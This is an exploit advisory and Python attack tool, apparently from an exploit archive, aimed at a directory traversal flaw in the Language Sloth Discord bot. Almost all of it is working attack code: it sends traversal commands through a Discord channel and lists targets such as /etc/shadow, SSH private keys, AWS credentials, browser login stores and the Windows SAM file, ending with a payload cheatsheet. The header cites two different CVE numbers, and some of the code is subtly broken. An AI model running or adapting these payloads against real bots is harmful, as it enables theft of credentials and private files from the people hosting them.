@@ -1,0 +1,733 @@
+=============================================================================================================================================
+| # Title     : Discord Language Sloth Bot Automated Scanner & Payload Generator                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://discordbotlist.com/bots                                                                                             |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212248/ & CVE-2025-59789
+
+[+] Summary : The Language Sloth Discord bot contains a critical directory traversal vulnerability allowing attackers to read arbitrary files on the server hosting the bot through improperly sanitized user input in file path operations.
+
+[+] Affected : All versions with vulnerable files.py
+
+[+]  POC : python poc.py
+
+Usage Examples
+
+# Interactive mode
+
+python Poc.py --interactive
+
+# Generate payload cheatsheet
+
+python Poc.py --cheatsheet
+
+# Automated vulnerability scan
+
+python Poc.py --scan --token "YOUR_BOT_TOKEN" --channel 123456789 --prefix "z!"
+
+# Test single payload
+
+python Poc.py --test --token "YOUR_BOT_TOKEN" --channel 123456789 --payload "../etc/passwd" --type gif
+
+# Custom file targeting
+
+python Poc.py --custom --token "YOUR_BOT_TOKEN" --channel 123456789 --target "/etc/shadow"
+
+===================================================
+#!/usr/bin/env python3
+"""
+COMPLETE DISCORD BOT DIRECTORY TRAVERSAL EXPLOIT - CVE-2025-65321
+Language Sloth Discord Bot Path Traversal Vulnerability
+Author: indoushka
+"""
+
+import discord
+import asyncio
+import aiohttp
+import os
+import sys
+import argparse
+import json
+from pathlib import Path
+from typing import Optional
+import platform
+
+class DiscordBotExploit:
+    def __init__(self, bot_token: str = None):
+        self.bot_token = bot_token
+        self.intents = discord.Intents.default()
+        self.intents.message_content = True
+        self.bot = None
+        self.exploit_results = []
+        
+        # Operating system detection
+        self.os_type = platform.system().lower()
+        
+        # Common sensitive file paths by OS
+        self.sensitive_paths = {
+            'windows': {
+                'system': [
+                    'C:\\Windows\\System32\\config\\SAM',
+                    'C:\\Windows\\System32\\config\\SYSTEM',
+                    'C:\\Windows\\win.ini',
+                    'C:\\Windows\\system.ini',
+                    'C:\\Boot\\BCD',
+                    'C:\\Windows\\Panther\\unattend.xml',
+                    'C:\\Windows\\Panther\\unattend.txt',
+                    'C:\\unattend.xml',
+                    'C:\\unattend.txt'
+                ],
+                'user_files': [
+                    'C:\\Users\\{USER}\\Desktop\\desktop.ini',
+                    'C:\\Users\\{USER}\\Documents',
+                    'C:\\Users\\{USER}\\Downloads'
+                ],
+                'ssh_keys': [
+                    'C:\\Users\\{USER}\\.ssh\\id_rsa',
+                    'C:\\Users\\{USER}\\.ssh\\id_rsa.pub',
+                    'C:\\Users\\{USER}\\.ssh\\known_hosts',
+                    'C:\\Users\\{USER}\\.ssh\\config'
+                ],
+                'web_credentials': [
+                    'C:\\Users\\{USER}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
+                    'C:\\Users\\{USER}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json',
+                    'C:\\Users\\{USER}\\AppData\\Local\\Microsoft\\Credentials\\*'
+                ],
+                'config_files': [
+                    'C:\\ProgramData\\chocolatey\\config\\chocolatey.config',
+                    'C:\\Program Files\\MySQL\\MySQL Server *\\my.ini',
+                    'C:\\xampp\\php\\php.ini',
+                    'C:\\xampp\\apache\\conf\\httpd.conf'
+                ]
+            },
+            'linux': {
+                'system': [
+                    '/etc/passwd',
+                    '/etc/shadow',
+                    '/etc/hosts',
+                    '/etc/hostname',
+                    '/etc/resolv.conf',
+                    '/etc/fstab',
+                    '/etc/crontab',
+                    '/etc/ssh/sshd_config',
+                    '/etc/sudoers',
+                    '/etc/environment'
+                ],
+                'user_files': [
+                    '/home/{USER}/.bash_history',
+                    '/home/{USER}/.ssh/id_rsa',
+                    '/home/{USER}/.ssh/id_rsa.pub',
+                    '/home/{USER}/.ssh/known_hosts',
+                    '/home/{USER}/.ssh/authorized_keys',
+                    '/home/{USER}/.aws/credentials',
+                    '/home/{USER}/.gitconfig'
+                ],
+                'web_servers': [
+                    '/etc/nginx/nginx.conf',
+                    '/etc/apache2/apache2.conf',
+                    '/etc/apache2/sites-available/000-default.conf',
+                    '/var/www/html/index.php',
+                    '/var/www/html/config.php'
+                ],
+                'databases': [
+                    '/etc/mysql/my.cnf',
+                    '/var/lib/mysql/mysql/user.MYD',
+                    '/var/lib/postgresql/*/pg_hba.conf'
+                ],
+                'docker': [
+                    '/var/run/docker.sock',
+                    '/etc/docker/daemon.json'
+                ]
+            },
+            'darwin': {
+                'system': [
+                    '/etc/passwd',
+                    '/etc/master.passwd',
+                    '/etc/hosts',
+                    '/etc/resolv.conf',
+                    '/etc/sudoers',
+                    '/private/etc/ssh/sshd_config'
+                ],
+                'user_files': [
+                    '/Users/{USER}/.bash_history',
+                    '/Users/{USER}/.ssh/id_rsa',
+                    '/Users/{USER}/.ssh/id_rsa.pub',
+                    '/Users/{USER}/.aws/credentials',
+                    '/Users/{USER}/Library/Keychains/login.keychain-db',
+                    '/Users/{USER}/Library/Application Support/Google/Chrome/Default/Login Data'
+                ],
+                'applications': [
+                    '/Applications',
+                    '/Library/Preferences',
+                    '/Library/LaunchDaemons'
+                ]
+            }
+        }
+    
+    def generate_traversal_payloads(self, target_path: str, file_type: str = 'gif') -> list:
+        """
+        Generate directory traversal payloads for specific target
+        
+        Args:
+            target_path: Absolute or relative path to target file
+            file_type: 'gif' or 'png' (bot command type)
+        
+        Returns:
+            List of payload strings
+        """
+        payloads = []
+        
+        # Clean target path
+        target_path = target_path.replace('/', '\\') if self.os_type == 'windows' else target_path
+        
+        # Remove file extension if present
+        if target_path.endswith(('.gif', '.png')):
+            target_path = target_path[:-4]
+        
+        # Generate traversal sequences
+        if self.os_type == 'windows':
+            # Windows path traversal
+            base_payload = f"..\\..\\..\\..\\..\\..\\{target_path}"
+            
+            # Multiple depth variations
+            for depth in range(1, 15):
+                traversal = "..\\" * depth
+                payloads.append(f"{traversal}{target_path}")
+            
+            # UNC path attempts
+            if target_path.startswith('C:'):
+                unc_path = target_path.replace('C:', '\\\\localhost\\C$')
+                payloads.append(f"..\\..\\..\\..\\..\\..\\{unc_path}")
+            
+            # Network share attempts
+            payloads.append(f"..\\..\\..\\..\\..\\..\\Windows\\C$\\{target_path[3:]}")
+            
+        else:
+            # Linux/Mac path traversal
+            base_payload = f"../../../../../../../{target_path}"
+            
+            # Multiple depth variations
+            for depth in range(1, 15):
+                traversal = "../" * depth
+                payloads.append(f"{traversal}{target_path}")
+            
+            # Absolute path attempt (might work with some sanitization bypass)
+            payloads.append(f"/{target_path}")
+        
+        # Add null byte injection attempts (for certain Python versions)
+        for payload in payloads[:]:  # Copy list to avoid modification during iteration
+            payloads.append(f"{payload}.gif\\x00" if file_type == 'gif' else f"{payload}.png\\x00")
+            payloads.append(f"{payload}%00" if file_type == 'gif' else f"{payload}%00")
+        
+        # Add URL encoding
+        for payload in payloads[:]:
+            encoded = payload.replace('../', '%2e%2e%2f').replace('..\\', '%2e%2e%5c')
+            payloads.append(encoded)
+        
+        return list(set(payloads))[:50]  # Remove duplicates and limit
+    
+    def generate_common_exploits(self) -> dict:
+        """
+        Generate common exploitation payloads for the bot
+        """
+        exploits = {}
+        
+        # Basic traversal tests
+        exploits['basic_traversal'] = [
+            '../etc/passwd',
+            '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
+            '../../../../../etc/shadow',
+            '..\\..\\..\\..\\Windows\\win.ini'
+        ]
+        
+        # Information disclosure
+        exploits['information'] = {
+            'passwd': '../etc/passwd',
+            'shadow': '../../../../../etc/shadow',
+            'hosts': '../etc/hosts',
+            'history': '../../.bash_history'
+        }
+        
+        # Configuration files
+        exploits['configs'] = {
+            'ssh_config': '../etc/ssh/sshd_config',
+            'nginx_conf': '../etc/nginx/nginx.conf',
+            'apache_conf': '../etc/apache2/apache2.conf',
+            'mysql_conf': '../etc/mysql/my.cnf'
+        }
+        
+        # Docker/container escape attempts
+        exploits['docker'] = [
+            '../var/run/docker.sock',
+            '../../var/run/docker.sock',
+            '../../../var/run/docker.sock'
+        ]
+        
+        # Environment variables
+        exploits['env'] = [
+            '../proc/self/environ',
+            '../../proc/self/environ',
+            '../../../proc/self/environ'
+        ]
+        
+        # Web server files
+        exploits['web'] = [
+            '../var/www/html/index.php',
+            '../../var/www/html/config.php',
+            '../index.html',
+            '../../index.html'
+        ]
+        
+        # Log files
+        exploits['logs'] = {
+            'auth_log': '../var/log/auth.log',
+            'syslog': '../var/log/syslog',
+            'apache_access': '../var/log/apache2/access.log',
+            'apache_error': '../var/log/apache2/error.log'
+        }
+        
+        return exploits
+    
+    async def test_exploit_async(self, channel_id: int, command_prefix: str = 'z!', 
+                                file_type: str = 'gif', payload: str = '../etc/passwd') -> dict:
+        """
+        Test a single exploitation payload asynchronously
+        
+        Args:
+            channel_id: Discord channel ID to send to
+            command_prefix: Bot command prefix (default: 'z!')
+            file_type: 'gif' or 'png'
+            payload: Traversal payload
+        
+        Returns:
+            Dictionary with results
+        """
+        result = {
+            'payload': payload,
+            'command': f"{command_prefix}{file_type} {payload}",
+            'success': False,
+            'response': None,
+            'error': None
+        }
+        
+        try:
+            channel = self.bot.get_channel(channel_id)
+            if not channel:
+                result['error'] = f"Channel {channel_id} not found"
+                return result
+            
+            # Send the exploit command
+            message = await channel.send(result['command'])
+            
+            # Wait for response (bot might reply or send file)
+            await asyncio.sleep(3)
+            
+            # Check for new messages
+            async for msg in channel.history(limit=5):
+                if msg.author == self.bot.user and msg != message:
+                    result['response'] = msg.content
+                    
+                    # Check if file was attached
+                    if msg.attachments:
+                        result['files'] = [att.url for att in msg.attachments]
+                        result['success'] = True
+                    
+                    # Check for error messages
+                    if "File not found" in msg.content or "error" in msg.content.lower():
+                        result['success'] = False
+                        result['error'] = msg.content
+                    else:
+                        result['success'] = True
+                    
+                    break
+            
+            # Clean up our message
+            try:
+                await message.delete()
+            except:
+                pass
+                
+        except Exception as e:
+            result['error'] = str(e)
+        
+        return result
+    
+    async def automated_exploit_scan(self, channel_id: int, command_prefix: str = 'z!') -> dict:
+        """
+        Perform automated scanning for vulnerable files
+        
+        Args:
+            channel_id: Discord channel ID
+            command_prefix: Bot command prefix
+        
+        Returns:
+            Dictionary with scan results
+        """
+        print(f"[*] Starting automated scan on channel {channel_id}")
+        print(f"[*] OS Detected: {self.os_type}")
+        
+        scan_results = {
+            'os': self.os_type,
+            'vulnerable_files': [],
+            'tested_payloads': [],
+            'failed_payloads': []
+        }
+        
+        # Get common paths for current OS
+        if self.os_type in self.sensitive_paths:
+            sensitive_files = self.sensitive_paths[self.os_type]
+            
+            # Flatten the list
+            all_files = []
+            for category, files in sensitive_files.items():
+                for file_path in files:
+                    # Replace {USER} placeholder with common usernames
+                    if '{USER}' in file_path:
+                        for user in ['admin', 'root', 'ubuntu', 'ec2-user', 'user', 'test']:
+                            all_files.append(file_path.replace('{USER}', user))
+                    else:
+                        all_files.append(file_path)
+            
+            # Test each file with both gif and png commands
+            for file_path in all_files[:50]:  # Limit to first 50 files
+                for file_type in ['gif', 'png']:
+                    payloads = self.generate_traversal_payloads(file_path, file_type)
+                    
+                    for payload in payloads[:3]:  # Test first 3 payload variations
+                        print(f"[*] Testing: {command_prefix}{file_type} {payload}")
+                        
+                        result = await self.test_exploit_async(
+                            channel_id, command_prefix, file_type, payload
+                        )
+                        
+                        scan_results['tested_payloads'].append(result)
+                        
+                        if result['success']:
+                            print(f"[+] SUCCESS: Retrieved file with payload: {payload}")
+                            scan_results['vulnerable_files'].append({
+                                'path': file_path,
+                                'payload': payload,
+                                'type': file_type,
+                                'response': result['response']
+                            })
+                        
+                        # Be nice to the Discord API
+                        await asyncio.sleep(1)
+        
+        return scan_results
+    
+    def create_exploit_bot(self):
+        """Create a Discord bot client for exploitation"""
+        
+        class ExploitBot(discord.Client):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, **kwargs)
+                self.exploiter = kwargs.pop('exploiter')
+            
+            async def on_ready(self):
+                print(f'[*] Logged in as {self.user}')
+                print(f'[*] Bot ID: {self.user.id}')
+                print('[*] Starting exploitation...')
+                
+                # Store reference
+                self.exploiter.bot = self
+        
+        self.bot = ExploitBot(intents=self.intents, exploiter=self)
+    
+    async def run_exploit(self, token: str, channel_id: int, 
+                         command_prefix: str = 'z!', mode: str = 'scan'):
+        """
+        Main exploitation runner
+        
+        Args:
+            token: Discord bot token
+            channel_id: Target channel ID
+            command_prefix: Bot command prefix
+            mode: 'scan', 'single', or 'custom'
+        """
+        try:
+            # Create and run bot
+            self.create_exploit_bot()
+            
+            # Run bot in background
+            bot_task = asyncio.create_task(self.bot.start(token))
+            
+            # Wait for bot to be ready
+            await asyncio.sleep(5)
+            
+            if mode == 'scan':
+                # Run automated scan
+                results = await self.automated_exploit_scan(channel_id, command_prefix)
+                
+                # Print results
+                print("\n" + "="*80)
+                print("EXPLOITATION RESULTS")
+                print("="*80)
+                
+                if results['vulnerable_files']:
+                    print("[+] VULNERABLE FILES FOUND:")
+                    for file_info in results['vulnerable_files']:
+                        print(f"  • {file_info['path']}")
+                        print(f"    Payload: {command_prefix}{file_info['type']} {file_info['payload']}")
+                        print()
+                else:
+                    print("[-] No vulnerable files found with automated scan")
+                
+                print(f"[*] Total payloads tested: {len(results['tested_payloads'])}")
+                
+            elif mode == 'single':
+                # Test single payload
+                payload = input("Enter traversal payload: ")
+                file_type = input("File type (gif/png): ").lower()
+                
+                if file_type not in ['gif', 'png']:
+                    print("[-] Invalid file type. Using 'gif'")
+                    file_type = 'gif'
+                
+                result = await self.test_exploit_async(channel_id, command_prefix, file_type, payload)
+                
+                print("\n" + "="*80)
+                print("EXPLOIT TEST RESULT")
+                print("="*80)
+                print(f"Payload: {result['payload']}")
+                print(f"Command: {result['command']}")
+                print(f"Success: {result['success']}")
+                
+                if result['response']:
+                    print(f"Response: {result['response']}")
+                if result.get('files'):
+                    print(f"Files: {result['files']}")
+                if result['error']:
+                    print(f"Error: {result['error']}")
+            
+            elif mode == 'custom':
+                # Custom exploitation
+                target_file = input("Enter target file path: ")
+                file_type = input("File type (gif/png): ").lower()
+                
+                if file_type not in ['gif', 'png']:
+                    file_type = 'gif'
+                
+                payloads = self.generate_traversal_payloads(target_file, file_type)
+                
+                print(f"\n[*] Generated {len(payloads)} payloads")
+                print("[*] Testing payloads...")
+                
+                successful = []
+                for i, payload in enumerate(payloads[:10]):  # Test first 10
+                    print(f"[*] Testing payload {i+1}/{min(10, len(payloads))}: {payload}")
+                    
+                    result = await self.test_exploit_async(channel_id, command_prefix, file_type, payload)
+                    
+                    if result['success']:
+                        successful.append(payload)
+                        print(f"[+] SUCCESS with payload: {payload}")
+                    
+                    await asyncio.sleep(1)
+                
+                if successful:
+                    print(f"\n[+] {len(successful)} successful payloads found!")
+                    for payload in successful:
+                        print(f"  • {command_prefix}{file_type} {payload}")
+                else:
+                    print("\n[-] No successful payloads found")
+            
+            # Stop the bot
+            await self.bot.close()
+            
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            import traceback
+            traceback.print_exc()
+    
+    def generate_payload_cheatsheet(self):
+        """Generate a payload cheatsheet for manual testing"""
+        print("\n" + "="*80)
+        print("DIRECTORY TRAVERSAL PAYLOAD CHEATSHEET")
+        print("="*80)
+        print("\nBasic Traversal:")
+        print("  z!gif ../etc/passwd")
+        print("  z!png ../../etc/shadow")
+        print("  z!gif ..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts")
+        
+        print("\nWindows Specific:")
+        print("  z!gif ..\\..\\..\\..\\Windows\\win.ini")
+        print("  z!png ..\\..\\..\\..\\Windows\\System32\\config\\SAM")
+        print("  z!gif ..\\..\\..\\..\\ProgramData\\Microsoft\\Windows\\Start Menu")
+        
+        print("\nLinux Specific:")
+        print("  z!png ../../../../../etc/passwd")
+        print("  z!gif ../etc/ssh/sshd_config")
+        print("  z!png ../../.bash_history")
+        
+        print("\nWeb Server Files:")
+        print("  z!gif ../var/www/html/index.php")
+        print("  z!png ../../var/www/html/config.php")
+        print("  z!gif ../index.html")
+        
+        print("\nConfiguration Files:")
+        print("  z!png ../etc/nginx/nginx.conf")
+        print("  z!gif ../etc/mysql/my.cnf")
+        print("  z!png ../etc/apache2/apache2.conf")
+        
+        print("\nDocker/Container:")
+        print("  z!gif ../var/run/docker.sock")
+        print("  z!png ../../var/run/docker.sock")
+        
+        print("\nLog Files:")
+        print("  z!gif ../var/log/auth.log")
+        print("  z!png ../../var/log/syslog")
+        
+        print("\nUser Files:")
+        print("  z!gif ../.ssh/id_rsa")
+        print("  z!png ../../.ssh/id_rsa.pub")
+        print("  z!gif ../.aws/credentials")
+        
+        print("\n" + "="*80)
+        print("REMEMBER: Use 'z!gif' for .gif files, 'z!png' for .png files")
+        print("The bot expects the file to have the correct extension")
+        print("="*80)
+
+def interactive_mode():
+    """Interactive command-line interface"""
+    print("""
+    ╔══════════════════════════════════════════════════════════╗
+    ║   LANGUAGE SLOTH DISCORD BOT EXPLOIT - CVE-2025-65321    ║
+    ║              Directory Traversal Vulnerability           ║
+    ║                    by indoushka                          ║
+    ╚══════════════════════════════════════════════════════════╝
+    """)
+    
+    exploit = DiscordBotExploit()
+    
+    while True:
+        print("\n" + "="*80)
+        print("MAIN MENU")
+        print("="*80)
+        print("1. Generate payload cheatsheet")
+        print("2. Automated vulnerability scan (requires bot token)")
+        print("3. Test single payload (requires bot token)")
+        print("4. Custom file targeting (requires bot token)")
+        print("5. List sensitive file paths by OS")
+        print("6. Exit")
+        print("="*80)
+        
+        choice = input("\nSelect option: ")
+        
+        if choice == '1':
+            exploit.generate_payload_cheatsheet()
+        
+        elif choice == '2':
+            token = input("Enter Discord bot token: ")
+            channel_id = int(input("Enter target channel ID: "))
+            prefix = input("Enter bot command prefix (default: z!): ") or 'z!'
+            
+            asyncio.run(exploit.run_exploit(token, channel_id, prefix, 'scan'))
+        
+        elif choice == '3':
+            token = input("Enter Discord bot token: ")
+            channel_id = int(input("Enter target channel ID: "))
+            prefix = input("Enter bot command prefix (default: z!): ") or 'z!'
+            
+            asyncio.run(exploit.run_exploit(token, channel_id, prefix, 'single'))
+        
+        elif choice == '4':
+            token = input("Enter Discord bot token: ")
+            channel_id = int(input("Enter target channel ID: "))
+            prefix = input("Enter bot command prefix (default: z!): ") or 'z!'
+            
+            asyncio.run(exploit.run_exploit(token, channel_id, prefix, 'custom'))
+        
+        elif choice == '5':
+            print("\n" + "="*80)
+            print("SENSITIVE FILE PATHS")
+            print("="*80)
+            
+            for os_name, categories in exploit.sensitive_paths.items():
+                print(f"\n[{os_name.upper()}]")
+                for category, files in categories.items():
+                    print(f"\n  {category.replace('_', ' ').title()}:")
+                    for file_path in files[:5]:  # Show first 5
+                        print(f"    • {file_path}")
+        
+        elif choice == '6':
+            print("\n[+] Exiting...")
+            break
+        
+        else:
+            print("[-] Invalid option")
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Language Sloth Discord Bot Directory Traversal Exploit - CVE-2025-65321",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s --interactive
+  %(prog)s --cheatsheet
+  %(prog)s --scan --token TOKEN --channel 123456789 --prefix z!
+  %(prog)s --test --token TOKEN --channel 123456789 --payload "../etc/passwd"
+        """
+    )
+    
+    parser.add_argument("--interactive", action="store_true", help="Interactive mode")
+    parser.add_argument("--cheatsheet", action="store_true", help="Generate payload cheatsheet")
+    parser.add_argument("--scan", action="store_true", help="Automated vulnerability scan")
+    parser.add_argument("--test", action="store_true", help="Test single payload")
+    parser.add_argument("--custom", action="store_true", help="Custom file targeting")
+    parser.add_argument("--token", type=str, help="Discord bot token")
+    parser.add_argument("--channel", type=int, help="Target channel ID")
+    parser.add_argument("--prefix", type=str, default="z!", help="Bot command prefix")
+    parser.add_argument("--payload", type=str, help="Traversal payload to test")
+    parser.add_argument("--type", type=str, choices=['gif', 'png'], default='gif', help="File type")
+    parser.add_argument("--target", type=str, help="Target file path for custom mode")
+    
+    args = parser.parse_args()
+    
+    exploit = DiscordBotExploit()
+    
+    if args.interactive or (not any(vars(args).values())):
+        interactive_mode()
+    
+    elif args.cheatsheet:
+        exploit.generate_payload_cheatsheet()
+    
+    elif args.scan:
+        if not args.token or not args.channel:
+            print("[-] --token and --channel required for scan mode")
+            return
+        
+        asyncio.run(exploit.run_exploit(args.token, args.channel, args.prefix, 'scan'))
+    
+    elif args.test:
+        if not args.token or not args.channel:
+            print("[-] --token and --channel required for test mode")
+            return
+        
+        if not args.payload:
+            print("[-] --payload required for test mode")
+            return
+        
+        # Override mode to single
+        import asyncio
+        asyncio.run(exploit.run_exploit(args.token, args.channel, args.prefix, 'single'))
+    
+    elif args.custom:
+        if not args.token or not args.channel:
+            print("[-] --token and --channel required for custom mode")
+            return
+        
+        if not args.target:
+            print("[-] --target required for custom mode")
+            return
+        
+        asyncio.run(exploit.run_exploit(args.token, args.channel, args.prefix, 'custom'))
+
+if __name__ == "__main__":
+    main()
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
